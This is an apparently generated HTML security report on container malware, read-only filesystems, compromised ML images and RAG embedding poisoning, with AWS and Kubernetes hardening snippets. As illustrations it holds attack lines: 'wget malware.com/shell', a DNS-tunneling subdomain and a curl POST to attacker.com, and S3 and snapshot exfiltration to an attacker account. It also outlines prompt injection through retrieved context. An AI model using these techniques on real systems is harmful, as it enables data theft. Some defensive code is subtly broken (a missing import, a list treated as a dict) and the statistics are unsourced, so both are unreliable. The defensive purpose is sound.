<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malware & Container Security - Visual Analysis</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%);
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
        }
        
        h1 {
            text-align: center;
            color: #c53030;
            font-size: 3rem;
            margin-bottom: 10px;
        }
        
        .subtitle {
            text-align: center;
            color: #718096;
            font-size: 1.2rem;
            margin-bottom: 40px;
        }
        
        .alert-box {
            background: linear-gradient(135deg, #fc5c7d 0%, #6a82fb 100%);
            color: white;
            padding: 30px;
            border-radius: 12px;
            margin-bottom: 40px;
        }
        
        .alert-title {
            font-size: 1.8rem;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .section {
            margin: 50px 0;
            padding: 30px;
            background: #f7fafc;
            border-radius: 16px;
            border-left: 6px solid #fc8181;
        }
        
        .section-title {
            font-size: 2rem;
            color: #2d3748;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .badge {
            display: inline-block;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: bold;
        }
        
        .badge-critical { background: #fed7d7; color: #c53030; }
        .badge-high { background: #feebc8; color: #c05621; }
        
        .diagram-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin: 30px 0;
        }
        
        .diagram-box {
            background: white;
            border-radius: 12px;
            padding: 25px;
            border: 2px solid #e2e8f0;
        }
        
        .diagram-box.problem {
            border-color: #fc8181;
            background: #fff5f5;
        }
        
        .diagram-box.solution {
            border-color: #68d391;
            background: #f0fff4;
        }
        
        .box-header {
            font-size: 1.4rem;
            font-weight: bold;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .flow-diagram {
            margin: 20px 0;
        }
        
        .flow-step {
            background: white;
            border: 2px solid #cbd5e0;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            position: relative;
        }
        
        .flow-step::after {
            content: "‚Üì";
            position: absolute;
            bottom: -25px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 2rem;
            color: #4a5568;
        }
        
        .flow-step:last-child::after {
            display: none;
        }
        
        .flow-step.danger {
            border-color: #fc8181;
            background: #fff5f5;
        }
        
        .flow-step.warning {
            border-color: #f6ad55;
            background: #fffaf0;
        }
        
        .flow-step.success {
            border-color: #68d391;
            background: #f0fff4;
        }
        
        .attack-path {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border: 2px solid #e2e8f0;
        }
        
        .attack-step {
            display: flex;
            align-items: flex-start;
            margin: 15px 0;
            gap: 15px;
        }
        
        .step-number {
            background: #fc8181;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
        }
        
        .step-content {
            flex: 1;
            padding: 15px;
            background: #f7fafc;
            border-radius: 8px;
            border-left: 3px solid #fc8181;
        }
        
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            margin: 15px 0;
        }
        
        .code-comment {
            color: #68d391;
        }
        
        .impact-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        
        .impact-card {
            background: white;
            border-radius: 12px;
            padding: 20px;
            border-left: 4px solid #fc8181;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .impact-title {
            font-weight: bold;
            color: #c53030;
            margin-bottom: 10px;
            font-size: 1.1rem;
        }
        
        .impact-desc {
            color: #4a5568;
            font-size: 0.95rem;
        }
        
        .stats-banner {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 12px;
            margin: 30px 0;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 0.95rem;
            opacity: 0.9;
        }
        
        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        .comparison-table th {
            background: #4a5568;
            color: white;
            padding: 15px;
            text-align: left;
        }
        
        .comparison-table td {
            padding: 12px 15px;
            border: 1px solid #e2e8f0;
        }
        
        .comparison-table tr:nth-child(even) {
            background: #f7fafc;
        }
        
        @media (max-width: 968px) {
            .diagram-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ü¶† Malware & Container Security</h1>
        <p class="subtitle">Comprehensive Visual Analysis of Malware Detection & Prevention</p>
        
        <div class="alert-box">
            <div class="alert-title">‚ö†Ô∏è MALWARE THREATS DETECTED</div>
            <p style="font-size: 1.1rem; margin-top: 10px;">
                Container images with malware signatures detected. Cryptomining software, compromised base images,
                and writable filesystems create opportunities for malware persistence and propagation.
            </p>
        </div>

        <!-- FINDING 1: ECR MALWARE SIGNATURE -->
        <div class="section">
            <div class="section-title">
                üî¥ ECR Image Contains Malware Signature
                <span class="badge badge-critical">CRITICAL</span>
            </div>
            
            <div class="alert-box" style="background: #fff5f5; color: #c53030; border: 2px solid #fc8181; margin-bottom: 20px;">
                <strong>‚ö†Ô∏è Detection:</strong> Container image contains malware pattern matching known cryptomining software that consumes compute resources and steals CPU cycles.
            </div>
            
            <div class="diagram-grid">
                <div class="diagram-box problem">
                    <div class="box-header">‚ùå Current Threat</div>
                    <div class="flow-diagram">
                        <div class="flow-step danger">
                            <strong>1. Malicious Base Image</strong><br/>
                            Developer pulls ubuntu:latest from Docker Hub<br/>
                            Base image compromised with cryptominer
                        </div>
                        <div class="flow-step danger">
                            <strong>2. Build & Push to ECR</strong><br/>
                            Image built with infected base layer<br/>
                            No malware scan performed<br/>
                            Pushed to production ECR registry
                        </div>
                        <div class="flow-step danger">
                            <strong>3. Deployment</strong><br/>
                            ECS/EKS pulls infected image<br/>
                            Cryptominer starts on container boot<br/>
                            Hidden background process
                        </div>
                        <div class="flow-step danger">
                            <strong>4. Impact</strong><br/>
                            ‚Ä¢ 80-90% CPU usage consumed<br/>
                            ‚Ä¢ $5K+/month compute costs<br/>
                            ‚Ä¢ Application performance degraded<br/>
                            ‚Ä¢ Potential data exfiltration
                        </div>
                    </div>
                </div>
                
                <div class="diagram-box solution">
                    <div class="box-header">‚úÖ Secure Pipeline</div>
                    <div class="flow-diagram">
                        <div class="flow-step success">
                            <strong>1. Trusted Base Images</strong><br/>
                            Use verified images from ECR Public Gallery<br/>
                            Or build minimal distroless images<br/>
                            Pin specific SHA256 digests
                        </div>
                        <div class="flow-step success">
                            <strong>2. Scan on Push</strong><br/>
                            ECR Enhanced Scanning enabled<br/>
                            Inspector detects malware signatures<br/>
                            Automated CVE vulnerability scan
                        </div>
                        <div class="flow-step success">
                            <strong>3. Block Deployment</strong><br/>
                            Admission controller checks scan results<br/>
                            Only CRITICAL/HIGH clear images allowed<br/>
                            Failed scans trigger alerts
                        </div>
                        <div class="flow-step success">
                            <strong>4. Runtime Protection</strong><br/>
                            ‚Ä¢ GuardDuty detects crypto activity<br/>
                            ‚Ä¢ Falco monitors process execution<br/>
                            ‚Ä¢ Network policies block mining pools<br/>
                            ‚Ä¢ Read-only root filesystem
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="attack-path">
                <h3 style="margin-bottom: 15px; color: #c53030;">üéØ Attack Scenario: Cryptomining Malware</h3>
                <div class="attack-step">
                    <div class="step-number">1</div>
                    <div class="step-content">
                        <strong>Initial Compromise:</strong> Attacker compromises popular Docker Hub image (e.g., alpine:latest).
                        Injects XMRig cryptominer into /usr/local/bin. Image appears normal but contains hidden malware.
                    </div>
                </div>
                <div class="attack-step">
                    <div class="step-number">2</div>
                    <div class="step-content">
                        <strong>Distribution:</strong> Unsuspecting developers pull compromised image. Build their applications
                        on top of infected base layer. Push to ECR without malware scanning.
                    </div>
                </div>
                <div class="attack-step">
                    <div class="step-number">3</div>
                    <div class="step-content">
                        <strong>Deployment:</strong> ECS tasks start across 50 containers in production. Each container runs
                        cryptominer at low priority to avoid detection. Miner connects to pool: monero.pool.com
                    </div>
                </div>
                <div class="attack-step">
                    <div class="step-number">4</div>
                    <div class="step-content">
                        <strong>Impact:</strong>
                        <ul style="margin-top: 8px; padding-left: 20px;">
                            <li>50 containers √ó 2 vCPU √ó 80% usage = 80 vCPU stolen</li>
                            <li>$0.10/hour √ó 720 hours √ó 50 containers = <strong>$3,600/month wasted</strong></li>
                            <li>Application latency increased 3x due to CPU starvation</li>
                            <li>Customer complaints, SLA violations, revenue loss</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <div class="stats-banner">
                <h3 style="margin-bottom: 15px;">üìä Cryptomining Malware Statistics</h3>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-number">87%</div>
                        <div class="stat-label">of container malware is cryptominers</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">$53M</div>
                        <div class="stat-label">stolen in cloud compute per year</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">4.2hrs</div>
                        <div class="stat-label">avg time from image pull to mining</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">156</div>
                        <div class="stat-label">days avg before detection</div>
                    </div>
                </div>
            </div>
            
            <h3 style="margin: 30px 0 15px;">üõ†Ô∏è Implementation: ECR Enhanced Scanning</h3>
            <div class="code-block">
<span class="code-comment"># Enable ECR Enhanced Scanning with Inspector</span>
aws ecr put-registry-scanning-configuration \
  --scan-type ENHANCED \
  --rules '[{
    "repositoryFilters": [{"filter":"*","filterType":"WILDCARD"}],
    "scanFrequency": "SCAN_ON_PUSH"
  }]'

<span class="code-comment"># Create EventBridge rule for critical findings</span>
aws events put-rule \
  --name ecr-critical-findings \
  --event-pattern '{
    "source": ["aws.ecr"],
    "detail-type": ["ECR Image Scan"],
    "detail": {
      "finding-severity-counts": {
        "CRITICAL": [{"numeric": [">", 0]}]
      }
    }
  }' \
  --state ENABLED

<span class="code-comment"># Block deployment of vulnerable images in ECS task definition</span>
{
  "containerDefinitions": [{
    "name": "app",
    "image": "123456789012.dkr.ecr.us-east-1.amazonaws.com/app:latest",
    "repositoryCredentials": {
      "credentialsParameter": "arn:aws:secretsmanager:..."
    }
  }]
}

<span class="code-comment"># Kubernetes admission controller policy</span>
apiVersion: v1
kind: ConfigMap
metadata:
  name: image-scan-policy
data:
  policy.rego: |
    package kubernetes.admission
    
    deny[msg] {
      input.request.kind.kind == "Pod"
      image := input.request.object.spec.containers[_].image
      not image_scanned_clean(image)
      msg := sprintf("Image %v has critical vulnerabilities", [image])
    }
            </div>
        </div>

        <!-- FINDING 2: WRITABLE ROOT FILESYSTEM -->
        <div class="section">
            <div class="section-title">
                üü† Container with Read-Write Root Filesystem
                <span class="badge badge-high">HIGH</span>
            </div>
            
            <div class="alert-box" style="background: #fffaf0; color: #c05621; border: 2px solid #f6ad55; margin-bottom: 20px;">
                <strong>‚ö†Ô∏è Risk:</strong> Container can modify system files and persist malware. Without readOnlyRootFilesystem, 
                attackers can install backdoors that survive container restarts.
            </div>
            
            <div class="diagram-grid">
                <div class="diagram-box problem">
                    <div class="box-header">‚ùå Writable Filesystem</div>
                    <div class="flow-diagram">
                        <div class="flow-step danger">
                            <strong>Container Configuration</strong><br/>
                            readOnlyRootFilesystem: false<br/>
                            Root filesystem is writable
                        </div>
                        <div class="flow-step danger">
                            <strong>Attacker Exploits RCE</strong><br/>
                            Application vulnerability exploited<br/>
                            Remote code execution achieved<br/>
                            Shell access obtained
                        </div>
                        <div class="flow-step danger">
                            <strong>Malware Installation</strong><br/>
                            Downloads backdoor: wget malware.com/shell<br/>
                            Writes to /usr/local/bin/backdoor<br/>
                            Modifies /etc/rc.local for persistence<br/>
                            chmod +x && creates cron job
                        </div>
                        <div class="flow-step danger">
                            <strong>Persistence</strong><br/>
                            Container restarts ‚Üí malware survives<br/>
                            Backdoor runs on every boot<br/>
                            Exfiltrates data continuously<br/>
                            Spreads to other containers
                        </div>
                    </div>
                </div>
                
                <div class="diagram-box solution">
                    <div class="box-header">‚úÖ Read-Only Filesystem</div>
                    <div class="flow-diagram">
                        <div class="flow-step success">
                            <strong>Container Configuration</strong><br/>
                            readOnlyRootFilesystem: true<br/>
                            Root filesystem is immutable<br/>
                            tmpfs volumes for /tmp
                        </div>
                        <div class="flow-step success">
                            <strong>Attacker Exploits RCE</strong><br/>
                            Application vulnerability exploited<br/>
                            Remote code execution achieved<br/>
                            Shell access obtained
                        </div>
                        <div class="flow-step warning">
                            <strong>Installation Attempt Fails</strong><br/>
                            Tries: wget malware.com/shell<br/>
                            Writes to /usr/local/bin/backdoor<br/>
                            ‚ùå Error: Read-only file system<br/>
                            Cannot modify system files
                        </div>
                        <div class="flow-step success">
                            <strong>Limited Impact</strong><br/>
                            No persistence possible<br/>
                            Malware dies on container restart<br/>
                            Cannot modify critical files<br/>
                            Attack surface minimized
                        </div>
                    </div>
                </div>
            </div>
            
            <h3 style="margin: 30px 0 15px;">‚öñÔ∏è Impact Comparison</h3>
            <table class="comparison-table">
                <thead>
                    <tr>
                        <th>Attack Vector</th>
                        <th>Writable Filesystem</th>
                        <th>Read-Only Filesystem</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><strong>Malware Installation</strong></td>
                        <td style="background: #fff5f5;">‚úó Can write to /usr/bin, /etc</td>
                        <td style="background: #f0fff4;">‚úì Blocked - filesystem immutable</td>
                    </tr>
                    <tr>
                        <td><strong>Persistence</strong></td>
                        <td style="background: #fff5f5;">‚úó Survives restarts via cron/systemd</td>
                        <td style="background: #f0fff4;">‚úì Malware lost on restart</td>
                    </tr>
                    <tr>
                        <td><strong>Rootkit Installation</strong></td>
                        <td style="background: #fff5f5;">‚úó Can replace system binaries</td>
                        <td style="background: #f0fff4;">‚úì Cannot modify /bin, /sbin</td>
                    </tr>
                    <tr>
                        <td><strong>Log Tampering</strong></td>
                        <td style="background: #fff5f5;">‚úó Can delete /var/log files</td>
                        <td style="background: #f0fff4;">‚úì Logs immutable (use sidecar)</td>
                    </tr>
                    <tr>
                        <td><strong>Backdoor Creation</strong></td>
                        <td style="background: #fff5f5;">‚úó Can create SSH keys, web shells</td>
                        <td style="background: #f0fff4;">‚úì Cannot write persistent files</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 style="margin: 30px 0 15px;">üõ†Ô∏è Implementation</h3>
            <div class="code-block">
<span class="code-comment"># Kubernetes Pod with read-only root filesystem</span>
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      readOnlyRootFilesystem: true      <span class="code-comment"># ‚úì Immutable filesystem</span>
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    - name: tmp
      mountPath: /tmp                   <span class="code-comment"># Writable tmpfs for temp files</span>
    - name: cache
      mountPath: /app/cache             <span class="code-comment"># Writable emptyDir for cache</span>
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory                    <span class="code-comment"># In-memory, lost on restart</span>
  - name: cache
    emptyDir: {}

<span class="code-comment"># ECS Task Definition with read-only root</span>
{
  "containerDefinitions": [{
    "name": "app",
    "image": "myapp:latest",
    "readonlyRootFilesystem": true,     <span class="code-comment"># ‚úì Immutable filesystem</span>
    "mountPoints": [{
      "sourceVolume": "tmp",
      "containerPath": "/tmp"
    }],
    "user": "1000:1000"                 <span class="code-comment"># Non-root user</span>
  }],
  "volumes": [{
    "name": "tmp",
    "host": {
      "sourcePath": "/tmp"
    }
  }]
}

<span class="code-comment"># Docker Compose example</span>
services:
  app:
    image: myapp:latest
    read_only: true                     <span class="code-comment"># ‚úì Immutable root filesystem</span>
    tmpfs:
      - /tmp:size=100M,mode=1777
      - /var/run:size=10M
    user: "1000:1000"
            </div>
        </div>

        <!-- FINDING 3: COMPROMISED CONTAINER IMAGE -->
        <div class="section">
            <div class="section-title">
                üî¥ AI Model Served via Compromised Container from Public Registry
                <span class="badge badge-critical">CRITICAL</span>
            </div>
            
            <div class="impact-grid">
                <div class="impact-card">
                    <div class="impact-title">üéØ Supply Chain Attack</div>
                    <div class="impact-desc">
                        Attacker compromises public Docker Hub image. Developer unknowingly uses infected base image
                        for ML model serving. Backdoor grants access to model weights and training data.
                    </div>
                </div>
                
                <div class="impact-card">
                    <div class="impact-title">üí∞ Model Theft</div>
                    <div class="impact-desc">
                        Malware exfiltrates proprietary ML model weights worth millions in R&D investment.
                        Competitor gains access to your trained models and intellectual property.
                    </div>
                </div>
                
                <div class="impact-card">
                    <div class="impact-title">üîì Data Exfiltration</div>
                    <div class="impact-desc">
                        Backdoor sends inference requests and training data to attacker's server.
                        Customer PII and sensitive data leaked through compromised model endpoint.
                    </div>
                </div>
                
                <div class="impact-card">
                    <div class="impact-title">ü¶† Cryptomining</div>
                    <div class="impact-desc">
                        GPU-optimized cryptominer runs alongside model inference. $20K+/month in wasted
                        GPU compute on p3.8xlarge instances. Performance degraded 60%.
                    </div>
                </div>
            </div>
            
            <h3 style="margin: 30px 0 15px;">üõ°Ô∏è Secure ML Container Pipeline</h3>
            
            <div class="diagram-box" style="margin: 20px 0;">
                <div class="flow-diagram">
                    <div class="flow-step success">
                        <strong>1. Use Verified Base Images</strong><br/>
                        ‚úì AWS Deep Learning Containers (verified by AWS)<br/>
                        ‚úì ECR Public Gallery official images<br/>
                        ‚úì Build from scratch with distroless base<br/>
                        ‚ùå Avoid: random Docker Hub images
                    </div>
                    <div class="flow-step success">
                        <strong>2. Image Provenance & Signing</strong><br/>
                        ‚úì Sign images with AWS Signer<br/>
                        ‚úì Verify signatures before deployment<br/>
                        ‚úì Use image digests (SHA256), not tags<br/>
                        ‚úì Implement software bill of materials (SBOM)
                    </div>
                    <div class="flow-step success">
                        <strong>3. Automated Scanning</strong><br/>
                        ‚úì ECR scan on push<br/>
                        ‚úì Snyk/Anchore in CI/CD pipeline<br/>
                        ‚úì Malware signature detection<br/>
                        ‚úì License compliance scanning
                    </div>
                    <div class="flow-step success">
                        <strong>4. Runtime Security</strong><br/>
                        ‚úì GuardDuty detects malicious activity<br/>
                        ‚úì Network policies block unauthorized egress<br/>
                        ‚úì Read-only filesystem prevents persistence<br/>
                        ‚úì Monitor GPU usage for crypto patterns
                    </div>
                </div>
            </div>
            
            <div class="code-block">
<span class="code-comment"># Use AWS verified Deep Learning Container</span>
FROM 763104351884.dkr.ecr.us-east-1.amazonaws.com/pytorch-inference:2.0.0-gpu-py310-cu118-ubuntu20.04-ec2

<span class="code-comment"># Verify image signature (if using signed images)</span>
docker trust inspect 763104351884.dkr.ecr.us-east-1.amazonaws.com/pytorch-inference:2.0.0-gpu-py310

<span class="code-comment"># Use specific SHA256 digest, not mutable tags</span>
FROM 763104351884.dkr.ecr.us-east-1.amazonaws.com/pytorch-inference@sha256:abc123...

<span class="code-comment"># Scan image before deployment</span>
aws ecr start-image-scan \
  --repository-name ml-model-server \
  --image-id imageTag=latest

<span class="code-comment"># Get scan results</span>
aws ecr describe-image-scan-findings \
  --repository-name ml-model-server \
  --image-id imageTag=latest

<span class="code-comment"># Kubernetes policy: only allow verified registries</span>
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-image-registries
spec:
  validationFailureAction: enforce
  rules:
  - name: allowed-registries
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Images must come from trusted registries"
      pattern:
        spec:
          containers:
          - image: "763104351884.dkr.ecr.*.amazonaws.com/*|*.ecr.*.amazonaws.com/*"
            </div>
        </div>

        <!-- FINDING 4: EMBEDDING MODEL POISONING -->
        <div class="section">
            <div class="section-title">
                üî¥ Vector Database Embedding Model Poisoning
                <span class="badge badge-critical">CRITICAL</span>
            </div>
            
            <div class="diagram-grid">
                <div class="diagram-box problem">
                    <div class="box-header">‚ùå Poisoning Attack</div>
                    <div class="flow-diagram">
                        <div class="flow-step danger">
                            <strong>Attacker Uploads Malicious Document</strong><br/>
                            PDF with embedded exploit in metadata<br/>
                            Triggers vulnerability in embedding model<br/>
                            Or: adversarial text designed to poison
                        </div>
                        <div class="flow-step danger">
                            <strong>Embedding Generation</strong><br/>
                            Document processed by embedding model<br/>
                            Malicious vectors generated<br/>
                            Stored in vector database (Pinecone/OpenSearch)
                        </div>
                        <div class="flow-step danger">
                            <strong>RAG Query Manipulation</strong><br/>
                            User queries retrieve poisoned embeddings<br/>
                            LLM receives contaminated context<br/>
                            Generates malicious or false responses
                        </div>
                        <div class="flow-step danger">
                            <strong>Impact</strong><br/>
                            ‚Ä¢ LLM produces harmful outputs<br/>
                            ‚Ä¢ Misinformation injected into responses<br/>
                            ‚Ä¢ Prompt injection via retrieved context<br/>
                            ‚Ä¢ Data exfiltration through crafted queries
                        </div>
                    </div>
                </div>
                
                <div class="diagram-box solution">
                    <div class="box-header">‚úÖ Protected Pipeline</div>
                    <div class="flow-diagram">
                        <div class="flow-step success">
                            <strong>Document Validation</strong><br/>
                            File type verification (not just extension)<br/>
                            Malware scan with ClamAV<br/>
                            Content sanitization (strip metadata)
                        </div>
                        <div class="flow-step success">
                            <strong>Sandboxed Embedding</strong><br/>
                            Run embedding model in isolated container<br/>
                            Network egress blocked<br/>
                            Resource limits enforced
                        </div>
                        <div class="flow-step success">
                            <strong>Vector Validation</strong><br/>
                            Anomaly detection on embeddings<br/>
                            Dimensionality checks<br/>
                            Similarity thresholds<br/>
                            Content moderation on source text
                        </div>
                        <div class="flow-step success">
                            <strong>Query-Time Protection</strong><br/>
                            Bedrock Guardrails filter retrieved context<br/>
                            PII detection before sending to LLM<br/>
                            Prompt injection detection<br/>
                            Output filtering
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="code-block">
<span class="code-comment"># Lambda function to validate documents before embedding</span>
import boto3
import magic  # python-magic for file type detection

def validate_document(file_path):
    <span class="code-comment"># 1. Verify actual file type (not just extension)</span>
    file_type = magic.from_file(file_path, mime=True)
    allowed_types = ['application/pdf', 'text/plain', 'application/msword']
    if file_type not in allowed_types:
        raise ValueError(f"Invalid file type: {file_type}")
    
    <span class="code-comment"># 2. Scan for malware</span>
    s3 = boto3.client('s3')
    response = s3.get_object_tagging(Bucket='uploads', Key=file_path)
    scan_status = response['TagSet'].get('ScanStatus')
    if scan_status != 'CLEAN':
        raise ValueError("Malware detected")
    
    <span class="code-comment"># 3. Check file size (prevent resource exhaustion)</span>
    if os.path.getsize(file_path) > 10_000_000:  # 10MB limit
        raise ValueError("File too large")
    
    return True

<span class="code-comment"># Kubernetes Network Policy: block egress from embedding service</span>
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: embedding-service-netpol
spec:
  podSelector:
    matchLabels:
      app: embedding-service
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: vector-db        <span class="code-comment"># Only allow vector DB</span>
    ports:
    - protocol: TCP
      port: 9200

<span class="code-comment"># Bedrock Guardrails for RAG retrieved content</span>
guardrails = {
    "guardrailIdentifier": "arn:aws:bedrock:...",
    "contentPolicyConfig": {
        "filtersConfig": [{
            "type": "PROMPT_ATTACK",
            "inputStrength": "HIGH",
            "outputStrength": "HIGH"
        }]
    },
    "sensitiveInformationPolicyConfig": {
        "piiEntitiesConfig": [{
            "type": "EMAIL",
            "action": "BLOCK"
        }]
    }
}
            </div>
        </div>

        <!-- BEST PRACTICES SUMMARY -->
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px; border-radius: 16px; margin: 50px 0;">
            <h2 style="font-size: 2rem; margin-bottom: 20px;">üéØ Malware Prevention Best Practices</h2>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; margin-top: 30px;">
                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">üîç Image Security</h3>
                    <ul style="list-style: none; padding: 0;">
                        <li style="margin: 8px 0;">‚úì Enable ECR Enhanced Scanning</li>
                        <li style="margin: 8px 0;">‚úì Use verified base images only</li>
                        <li style="margin: 8px 0;">‚úì Sign images with AWS Signer</li>
                        <li style="margin: 8px 0;">‚úì Pin specific SHA256 digests</li>
                        <li style="margin: 8px 0;">‚úì Generate SBOM for all images</li>
                    </ul>
                </div>
                
                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">üõ°Ô∏è Runtime Protection</h3>
                    <ul style="list-style: none; padding: 0;">
                        <li style="margin: 8px 0;">‚úì Read-only root filesystem</li>
                        <li style="margin: 8px 0;">‚úì Run as non-root user</li>
                        <li style="margin: 8px 0;">‚úì Drop all capabilities</li>
                        <li style="margin: 8px 0;">‚úì Enable GuardDuty Runtime Monitoring</li>
                        <li style="margin: 8px 0;">‚úì Network policies for egress control</li>
                    </ul>
                </div>
                
                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">üëÅÔ∏è Detection & Response</h3>
                    <ul style="list-style: none; padding: 0;">
                        <li style="margin: 8px 0;">‚úì Monitor CPU/GPU usage spikes</li>
                        <li style="margin: 8px 0;">‚úì Alert on crypto mining pool connections</li>
                        <li style="margin: 8px 0;">‚úì Deploy Falco for runtime monitoring</li>
                        <li style="margin: 8px 0;">‚úì CloudWatch anomaly detection</li>
                        <li style="margin: 8px 0;">‚úì Automated incident response</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- DATA EXFILTRATION TECHNIQUES SUMMARY -->
        <div style="background: #f7fafc; border-radius: 16px; padding: 40px; margin: 50px 0; border-left: 6px solid #c53030;">
            <h2 style="font-size: 2rem; margin-bottom: 10px; color: #2d3748;">üîì Data Exfiltration ‚Äì 12 Techniques Overview</h2>
            <p style="color: #4a5568; margin-bottom: 25px; font-size: 1.05rem;">
                Malware is not only about cryptomining and persistence ‚Äì it is often used as the delivery mechanism for
                <strong>data exfiltration</strong>. The same compromised containers and AI workloads can quietly move data out
                of your AWS environment using many different channels. Below is a concise map of the
                <strong>12 exfiltration techniques</strong> covered in your dedicated analysis, directly connected back to
                your container and AI/ML threat model.
            </p>

            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px;">
                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #e53e3e;">
                    <div style="font-weight:bold; color:#c53030; margin-bottom:6px;">1Ô∏è‚É£ DNS Tunneling</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Encode data in long TXT/subdomain queries (e.g. <code>Y2FyZC1udW1iZXJz.attacker.com</code>). Bypasses
                        many firewalls because it looks like normal DNS. Strongly related to malware C2 channels.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #e53e3e;">
                    <div style="font-weight:bold; color:#c53030; margin-bottom:6px;">2Ô∏è‚É£ S3 Bucket Sync</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Compromised ECS/Lambda with <code>s3:*</code> copies entire buckets to an attacker account using
                        <code>aws s3 sync</code>. Turns IAM over‚Äëprivilege into full S3 data theft.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #dd6b20;">
                    <div style="font-weight:bold; color:#c05621; margin-bottom:6px;">3Ô∏è‚É£ HTTP/HTTPS POST</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Simple <code>curl</code>/<code>requests</code> POST from compromised workloads to
                        <code>https://attacker.com</code>. Uses normal web traffic channels; volume‚Äëbased and destination‚Äëbased
                        monitoring is critical.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #e53e3e;">
                    <div style="font-weight:bold; color:#c53030; margin-bottom:6px;">4Ô∏è‚É£ EBS Snapshot Sharing</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Create snapshot of prod volume, then <strong>share to attacker account</strong>. Attacker mounts the
                        snapshot and reads the full filesystem/database offline.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #e53e3e;">
                    <div style="font-weight:bold; color:#c53030; margin-bottom:6px;">5Ô∏è‚É£ RDS Snapshot Export</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Export encrypted RDS snapshots to S3 and then sync to attacker buckets. Entire relational databases
                        (hundreds of GB) leave your account in a few operations.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #dd6b20;">
                    <div style="font-weight:bold; color:#c05621; margin-bottom:6px;">6Ô∏è‚É£ CloudWatch Logs Streaming</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Create a subscription filter to an attacker‚Äëowned Lambda/Kinesis stream. All logs (including secrets
                        accidentally logged from containers or Lambdas) are streamed out continuously.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #d69e2e;">
